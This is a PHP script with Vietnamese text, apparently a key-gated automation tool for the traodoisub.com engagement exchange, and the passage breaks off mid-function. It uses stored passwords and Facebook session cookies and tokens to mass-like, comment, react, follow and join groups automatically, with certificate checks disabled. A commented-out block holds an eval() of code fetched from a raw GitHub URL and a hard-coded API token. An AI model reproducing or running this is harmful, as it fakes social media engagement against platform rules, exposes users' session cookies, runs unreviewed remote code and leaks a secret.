
/*** [ Rework By VuHoang ] ***/
# Donate Me: 0399498820 MOMO
if (file_exists("CookieLuuTam.txt")){unlink("CookieLuuTam.txt");}
//error_reporting(0);
system('clear');
Echo "Loading...\r";
$red="\033[1;31m"; $end="\033[0m";$black="\033[0;30m";$blackb="\033[1;30m";$white="\033[1;37m";$whiteb="\033[1;37m";$redb="\033[1;31m";$green="\033[0;32m";$greenb="\033[1;32m";$yellow="\033[0;33m";$yellowb="\033[1;33m";$syan="\033[1;36m";$blue="\033[0;34m";$blueb="\033[1;34m";$purple="\033[0;35m";$purpleb="\033[1;35m";$lightblue="\033[0;36m";$lightblue="\033[1;35m";$lightblueb="\033[1;36m";$red="\033[1;31m";$green="\033[1;32m";$yellow="\033[1;33m";$blud="\033[1;34m";$res="\033[1;35m";$nau="\033[1;36m";$trang="\033[1;37m";$cam= "\e[38;5;208m";$lavender="\033[1;95m";$peach="\033[1;96m";$coral="\033[1;97m";$charcoal="\033[1;98m";$maroon="\033[1;99m";$gold="\033[1;100m";
$teal="\033[1;101m";
$indigo="\033[1;102m";
$rose="\033[1;103m";
system ('clear');
$myfile = fopen("activestatus.txt", "w");
 $txt = 0;
 fwrite($myfile, $txt);
 fclose($myfile);
$loiii = 0;
echo "Loading (4)   \r";
function cc($vanban){$str = strlen($vanban);

 for($i=0;$i<=$str;$i++){echo $vanban[$i];usleep(1000);}
return 0;}
$icon1= "\033[1;37m•[✩]➭ \033[1;37m";
$icon2= "\033[1;33m•[۞] ➭ : \033[1;37m";

$ip = file_get_contents('http://kiemtraip.com/raw.php');
$file_luu_ip = "/sdcard/Android/datas/active/keytool/makeytool/ip.txt";
if(!file_exists($file_luu_ip)){
  $myfile = fopen($file_luu_ip, "w");
 $txt = $ip;
 fwrite($myfile, $txt);
 fclose($myfile);
}
echo "Loading (3) \r";
function getcode($n) {
 $characters = '123';
 $randomString = '';
 for ($i = 0; $i < 2; $i++) {
  $index = rand(0, strlen($characters) - 1);
  $randomString .= $characters[$index];
 }
 
 return $randomString;
}
function getcodea($n) {
 $characters = '012345';
 $randomString = '';
 for ($i = 0; $i < 1; $i++) {
  $index = rand(0, strlen($characters) - 1);
  $randomString .= $characters[$index];
 }
 
 return $randomString;
}
$banner = "\033[1;33m╔══════════════════════════════════════════════════════════════════════╗\n║   \033[38;5;225m╔╗ ╔═╗   ╔╗ ╔═╗    \033[38;5;196m【】                                           \033[1;33m ║\n║\033[1;33m   \033[38;5;189m║║ ║ ╝   ║║ ║ ╝    \033[38;5;197m【】 \033[38;5;119m 『 —————————————————————————————————————— \033[1;33m║\n\033[1;33m║\033[38;5;153m   ║║ ║║    ║║ ║║     \033[38;5;198m【】 \033[3;37m\033[38;5;087m    Made by: \033[3;37mKhang x Khôi     \033[0m             \033[1;33m║\n\033[1;33m║ \033[38;5;117m  ║║══╝    ║║══╝     \033[38;5;199m【】     \033[3;37m\033[38;5;039mNhóm zalo: \033[1;37mhttps://zalo.me/g/zvzsrw324 \033[0m\033[1;33m║\n\033[1;33m║ \033[38;5;081m  ║║══╗    ║║══╗     \033[38;5;200m【】     \033[3;37m\033[38;5;45mMua key vip: \033[1;37m0377205462 \033[0m               \033[1;33m║\n\033[1;33m║\033[38;5;045m   ║║ ║║    ║║ ║║     \033[38;5;201m【】  \033[3;37m\033[38;5;051m   Phiên bản:\033[1;37m V4.1  \033[0m                      \033[1;33m║\n\033[1;33m║ \033[38;5;51m  ║║ ║ ╗   ║║ ║ ╗    \033[38;5;206m【】\033[38;5;119m   ————————————————————————————————————— 』 \033[1;33m║\n\033[1;33m║  \033[38;5;123m ╚╝ ╚═╝   ╚╝ ╚═╝    \033[38;5;207m【】					       \033[1;33m║\n\033[1;33m╚══════════════════════════════════════════════════════════════════════╝\n\033[1;37m$greenb                     Ip của bạn là $ip\n";
/* if (!file_exists('/sdcard/Android/datas')) {
  mkdir("/sdcard/Android/datas");}
  if (!file_exists('/sdcard/Android/datas/active/')) {
 mkdir("/sdcard/Android/datas/active/");
   }
   if (!file_exists('/sdcard/Android/datas/active/keytool')) {
   mkdir("/sdcard/Android/datas/active/keytool/");}
   if (!file_exists('/sdcard/Android/datas/active/keytool/makeytool')) {
 mkdir("/sdcard/Android/datas/active/keytool/makeytool");}
 echo $icon2."Vui lòng đợi bạn nhé \r";
$codeactive= "/sdcard/Android/datas/active/keytool/makeytool/codekeyactive.txt";
if(!file_exists($codeactive)) {
  $random = getKey(20);
  file_put_contents("/sdcard/Android/datas/active/keytool/makeytool/codekeyactive.txt", $random);
  echo "Loading (2) \r";
} 
If (file_exists($codeactive))
{$myfile = fopen("/sdcard/Android/datas/active/keytool/makeytool/codekeyactive.txt", "r");
while(!feof($myfile))
{ $random = fgets($myfile); }
fclose($myfile); 
echo "Loading (2)   \r";
}
echo "Loading (2) \r";
$ip_cu = file_get_contents($file_luu_ip);
$file = '/sdcard/Android/datas/active/getkety.txt';
if (!file_exists($file)){
$codekey1 = getcodea(1);
$codekey = getcode(2);
$ah = fopen($file , "w");
fwrite ($ah, "$codekey1\n$codekey");
fclose ($file);}
if ($ip_cu == $ip) {} else {$codekey1 = getcodea(1);
$codekey = getcode(2);
$ah = fopen($file , "w");
fwrite ($ah, "$codekey1\n$codekey");
fclose ($file);}
$ah = fopen($file , "r");
$codekeya0 = fgets($ah);
$codekeya1 = fgets($ah);
fclose ($ah);
$codekeya1 = $codekeya1 + 0;
$codekeya0 = $codekeya0 + 3;
date_default_timezone_set('Asia/Ho_Chi_Minh');
system('clear');
echo "Loading (1) \r";
echo $lightblueb."Nếu lần đầu vô tool thì chạy lại nha, còn vô rồi thì đợi...\n";
$file_luu_key = "KhoiGolikevip.txt";
$today = date("d-m-y");
$key18 = "Khoivipv3".substr(strrev(md5($today)), $codekeya0 , $codekeya1);
eval(file_get_contents('https://raw.githubusercontent.com/khoido1303/khoido1303/main/ActiveKeyv3'));
$activeb = file_get_contents('activestatus.txt');
$myfile = fopen("activestatus.txt", "r");
 $activeb1 = fgets($myfile);
fclose($myfile);
echo "Loading (0) \r";
system('clear');
while (true){
  system('clear');
  cc($banner);
$activeb = $activeb + 0;
$activeb1 = $activeb1 + 0;
if ($activeb == 1 or $activeb1 == 1) {
 system('clear');echo ($banner);
  echo $redb. "\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈ \n\033[38;5;196m★BẠN ĐANG DÙNG TOOL VIP★ \n\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈ \n" ;
  sleep(1);break;}
 if (file_exists($file_luu_key)){
  $key_cu = file_get_contents($file_luu_key);
  if ($key_cu == $key18){
 echo "$icon1 Key đúng \n";
 sleep(1);
 system('clear');echo ($banner);
  echo "\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n\033[38;5;047m★BẠN ĐANG DÙNG TOOL THƯỜNG★\n\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n";
 for($time=5;$time>-1;$time--){
echo $whiteb." Vô tool sau".$cam." $time". $whiteb." mua vip để không cần chờ nha\r";sleep(1);}
   break;
  } else {
 if ($ip_cu != $ip) {ECHO "Khác ip! lấy lại key nhé\n";}
	echo $icon1."Key hết hạn lấy lại bạn nhé \n";sleep(2);
   unlink($file_luu_key);
   
  }
 }
 echo $icon2."Đang tạo key , Vui lòng đợi$cam 3$whiteb bạn nhé \r";
   $code1u = getName(20);
  $code2u = getName(32);
  $code3u = getName(22);
$long_url = urlencode("https://www.google.com.vn/search?q=$key18");
$api_token = 'a7c1835e-4da0-49ae-b238-55c546b301bc';
$api_url = "https://web1s.com/api?token={$api_token}&url={$long_url}&alias=$code1u";
$result = @json_decode(file_get_contents($api_url),TRUE);
if($result["status"] === 'error') {
  echo $result["message"];
} else {
  $linkweb1= $result["shortenedUrl"];
}
echo $icon2."Đang tạo key , Vui lòng đợi$cam 2$whiteb bạn nhé   \r";
$long_url = urlencode("$linkweb1");
$api_token = 'a7c1835e-4da0-49ae-b238-55c546b301bc';
$api_url = "https://web1s.com/api?token={$api_token}&url={$long_url}&alias=$code3u";
$result = @json_decode(file_get_contents($api_url),TRUE);
if($result["status"] === 'error') {
  echo $result["message"];
} else {
  $linkweb2= $result["shortenedUrl"];
}
echo $icon2."Đang tạo key , Vui lòng đợi$cam 1$whiteb bạn nhé  \r";
$long_url = urlencode("$linkweb2");
$api_token = 'a7c1835e-4da0-49ae-b238-55c546b301bc';
$api_url = "https://web1s.com/api?token={$api_token}&url={$long_url}&alias=$code2u";
$result = @json_decode(file_get_contents($api_url),TRUE);
if($result["status"] === 'error') {
  echo $result["message"];
} else {
  $linkvuot= $result["shortenedUrl"];
}

   if (!file_exists($file_luu_key)){
  echo $icon1."Ma kich hoat cua ban la: ".$random. "    \n";
  echo $icon1."\033[1;96mLưu Ý : Mua Vip để không cần vượt key, còn free thì vượt 3 link 60s nha\n";
 echo $icon1."\033[1;93mLink lấy key:\033[1;91m $linkvuot \n"; 
   echo $icon1."\033[1;92mNhập Key Để Vào Tool: \033[1;33m \n".$icon2;
   $makey = trim(fgets(STDIN));
 if ($makey == "" ) {exit("Loi khong xac dinh");}
 while (TRUE) {
   if ($makey == $key18){
  system('clear');echo ($banner);
 echo "\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n\033[38;5;047m★BẠN ĐANG DÙNG TOOL THƯỜNG★\n\033[38;5;159m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n";
 for($time=5;$time>-1;$time--){
echo $whiteb." Vô tool sau".$cam." $time". $whiteb." mua vip để không cần chờ nha\r";sleep(1);} 
 file_put_contents($file_luu_key, $makey);
 break;
   } else {
 echo "$icon1\033[1;91mKey Sai Vui Lòng Lấy Lại !\n";
 echo "$icon1\033[1;92mNhập Key Để Vào Tool: \n$icon2 \033[1;33m";
   $makey = trim(fgets(STDIN));
   }
   }break;
  }
 }*/
function getName($n) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $randomString = '';
 
 for ($i = 0; $i < 15; $i++) {
  $index = rand(0, strlen($characters) - 1);
  $randomString .= $characters[$index];
 }
 
 return $randomString;}
function getKey($n) {
 $characters = '0123456789';
 $randomString = '';
 for ($i = 0; $i < 15; $i++) {
  $index = rand(0, strlen($characters) - 1);
  $randomString .= $characters[$index];
 }
 
 return $randomString;
}
system('clear');
echo $banner;if ($ip_cu != $ip){
file_put_contents($file_luu_ip, $ip);
echo "$redb"."Đã Lưu ip \n";}
$red="\033[1;31m"; $end="\033[0m";$black="\033[0;30m";$blackb="\033[1;30m";$white="\033[1;37m";$whiteb="\033[1;37m";$redb="\033[1;31m";$green="\033[0;32m";$greenb="\033[1;32m";$yellow="\033[0;33m";$yellowb="\033[1;33m";$syan="\033[1;36m";$blue="\033[0;34m";$blueb="\033[1;34m";$purple="\033[0;35m";$purpleb="\033[1;35m";$lightblue="\033[0;36m";$lightblue="\033[1;35m";$lightblueb="\033[1;36m";$red="\033[1;31m";$green="\033[1;32m";$yellow="\033[1;33m";$blud="\033[1;34m";$res="\033[1;35m";$nau="\033[1;36m";$trang="\033[1;37m";$cam= "\e[38;5;208m";$lavender="\033[1;95m";$peach="\033[1;96m";$coral="\033[1;97m";$charcoal="\033[1;98m";$maroon="\033[1;99m";$gold="\033[1;100m";
$teal="\033[1;101m";
$indigo="\033[1;102m";
$rose="\033[1;103m";
  error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";

function thongtin($id, $cookie, $useragent)
{

 $ch = curl_init();
 $header = array(
  "Host:m.facebook.com",
  "user-agent:$useragent",
  "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "cookie:$cookie",
 );
 $linkbv = 'https://m.facebook.com/' . $id . '/about';
 curl_setopt($ch, CURLOPT_URL, $linkbv);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
 :'));
 $page = curl_exec($ch);
 $page1 = json_decode($page);
 return $page;
}
function logintds()
{
 $data   = fread(fopen("TaiKhoanTDS.txt", "r"), filesize("TaiKhoanTDS.txt"));
 $_SESSION["username"] = explode('|', $data)[0];
 $_SESSION['password'] = explode('|', $data)[1];
 $ch = curl_init();
   
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/login.php');
 curl_setopt($ch, CURLOPT_COOKIEJAR, "TDS.txt");
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36');
 
 $login = array('username' => $_SESSION['username'], 'password' => $_SESSION['password'], 'submit' => ' Đăng Nhập');
 curl_setopt($ch, CURLOPT_POST, count($login));
 curl_setopt($ch, CURLOPT_POSTFIELDS, $login);
 curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
 $source = curl_exec($ch);
 curl_close($ch);
}
function group_fb($id, $useragent, $cookie)
{
 $ch = curl_init();
 if (strpos($id, '_')) {
  $uid = explode('_', $id, 2);
  $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
 } else {
  $id2 = $id;
 }

 $header = array(
  "Host:mbasic.facebook.com",
  "user-agent:$useragent",
  "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "cookie:$cookie",
 );
 
 $linkbv = 'https://mbasic.facebook.com/groups/' . $id2;
 curl_setopt($ch, CURLOPT_URL, $linkbv);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
  :'));
 // json_decode(curl_exec($ch), true);
 $post = curl_exec($ch);


 $link = explode('<form method="post" action="/a/group/join/?group_id=', $post)[1];
 $link = explode('"', $link)[0];
 $link = html_entity_decode($link);
 $link = "https://mbasic.facebook.com/a/group/join/?group_id=" . $link;
 // echo $link;
 // die();
 $linkreac1 = $link;
 $header = array(
  "Host:mbasic.facebook.com",
  "user-agent:$useragent",
  "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "referer:$linkbv",
  "cookie:$cookie",
 );
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $linkreac1);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
 $page = curl_exec($ch);
 $aa = $page;

 return $aa;
}
function follow($idtest, $cookie)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $idtest . '?_rdr');
  $head[] = "Connection: keep-alive";
  $head[] = "Keep-Alive: 300";
  $head[] = "upgrade-insecure-requests: 1";
  $head[] = "sec-ch-ua-mobile: ?0";
  $head[] = "sec-fetch-user: ?1";
  $head[] = "sec-fetch-site: none";
  $head[] = "sec-fetch-dest: document";
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36');
  curl_setopt($ch, CURLOPT_COOKIE, $cookie);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_REFERER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 60);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  $access = curl_exec($ch);
  $url1 = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
  if (strpos($access, '/a/subscribe.php?') !== false) {
 $haha = explode('<a href="', $access);
 for ($v = 0; $v < count($haha); $v++) {
   if (strpos($haha[$v], '/a/subscribe.php?') !== false) {
  $haha2 = explode('" class=', $haha[$v])[0];
  break;
   }
 }
 $link2 = html_entity_decode($haha2);

 curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2 . '&_rdr');
 curl_setopt($ch, CURLOPT_REFERER, $url1);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 $fl = curl_exec($ch);

 curl_close($ch);

  } else {
 curl_close($ch);
 return 'id ' . $idtest . ' loi';

  }
}

function like($access_token, $id, $cookie)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/' . $id . '/likes');
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "authority: m.facebook.com";
 $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
 $head[] = "cache-control: max-age=0";
 $head[] = "upgrade-insecure-requests: 1";
 $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
 $head[] = "sec-fetch-site: none";
 $head[] = "sec-fetch-mode: navigate";
 $head[] = "sec-fetch-user: ?1";
 $head[] = "sec-fetch-dest: document";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
 $data = array('access_token' => $access_token);
 curl_setopt($ch, CURLOPT_POST, count($data));
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 $access = curl_exec($ch);
 curl_close($ch);
 return json_decode($access);
}
function cmt($access_token, $id, $cookie, $msg)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/' . $id . '/comments');
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "authority: m.facebook.com";
 $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
 $head[] = "cache-control: max-age=0";
 $head[] = "upgrade-insecure-requests: 1";
 $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
 $head[] = "sec-fetch-site: none";
 $head[] = "sec-fetch-mode: navigate";
 $head[] = "sec-fetch-user: ?1";
 $head[] = "sec-fetch-dest: document";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
 $data = array('message' => $msg, 'access_token' => $access_token);
 curl_setopt($ch, CURLOPT_POST, count($data));
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 $access = curl_exec($ch);
 curl_close($ch);
 return json_decode($access);
}
function camxuc($id, $type, $cookie) 
{
 $ch = curl_init();
 if (strpos($id, '_')) {
  $uid = explode('_', $id, 2);
  $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
 } else {
  $id2 = $id;
 }
 curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $id2);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
	:'));
 $page = curl_exec($ch);
 if ($id2 != $id && explode('&amp;origin_uri=', explode('amp;ft_id=', $page, 2)[1], 2)[0]) {
  $get = explode('&amp;origin_uri=', explode('amp;ft_id=', $page, 2)[1], 2)[0];
 } else {
  $get = $id2;
 }
 $link = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=' . $get;
 curl_setopt($ch, CURLOPT_URL, $link);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $cx = curl_exec($ch);
 $haha = explode('<a href="', $cx);
 if ($type == 'LIKE') {
  $haha2 = explode('" style="display:block"', $haha[1])[0];
 } elseif ($type == 'LOVE') {
  $haha2 = explode('" style="display:block"', $haha[2])[0];
 } elseif ($type == 'CARE') {
  $haha2 = explode('" style="display:block"', $haha[3])[0];
 } else if ($type == 'HAHA') {
  $haha2 = explode('" style="display:block"', $haha[4])[0];
 } else if ($type == 'WOW') {
  $haha2 = explode('" style="display:block"', $haha[5])[0];
 } else if ($type == 'SAD') {
  $haha2 = explode('" style="display:block"', $haha[6])[0];
 } elseif ($type == 'ANGRY') {
  $haha2 = explode('" style="display:block"', $haha[7])[0];
 }
 $link2 = html_entity_decode($haha2);
 curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_exec($ch);
 curl_close($ch);
}

function page($id, $cookie)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $id);
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "Accept-Language: en-us,en;q=0.5";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
	:'));
 $page = curl_exec($ch);
 if (explode('&amp;refid=', explode('pageSuggestionsOnLiking=1&amp;gfid=', $page)[1])[0]) {
  $get = explode('&amp;refid=', explode('pageSuggestionsOnLiking=1&amp;gfid=', $page)[1])[0];
  $link = 'https://mbasic.facebook.com/a/profile.php?fan&id=' . $id . '&origin=page_profile&pageSuggestionsOnLiking=1&gfid=' . $get . '&refid=17';
  curl_setopt($ch, CURLOPT_URL, $link);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_exec($ch);
 }
 curl_close($ch);
}

function datnick($idfb)
{
 $data = "iddat=" . $idfb;
 
 $head = array(
  "Host: traodoisub.com",
  "content-length: " . strlen($data),
  "accept: */*",
  "x-requested-with: XMLHttpRequest",
  "sec-ch-ua-mobile: ?1",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
  "content-type: application/x-www-form-urlencoded; charset=UTF-8",
  "origin: https://traodoisub.com",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: cors",
  "sec-fetch-dest: empty",
  "referer: https://traodoisub.com/view/cauhinh/"
 );
 
 $ch   = curl_init();
 curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://traodoisub.com/scr/datnick.php',
  CURLOPT_FOLLOWLOCATION => TRUE,
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_POST => 1,
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_COOKIEFILE => "TDS.txt",
  CURLOPT_HTTPHEADER => $head,
  CURLOPT_ENCODING => TRUE
 ));
 
 $a = curl_exec($ch);
 curl_close($ch);
 return $a;
}



function getnv($loai)
{
 $head = array(
  "Host: traodoisub.com",
  "save-data: on",
  "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
  "accept: */*",
  "sec-fetch-site: same-origin",
  "sec-fetch-mode: cors",
  "sec-fetch-dest: empty",
  "referer: https://traodoisub.com/ex/" . $loai . "/"
 );
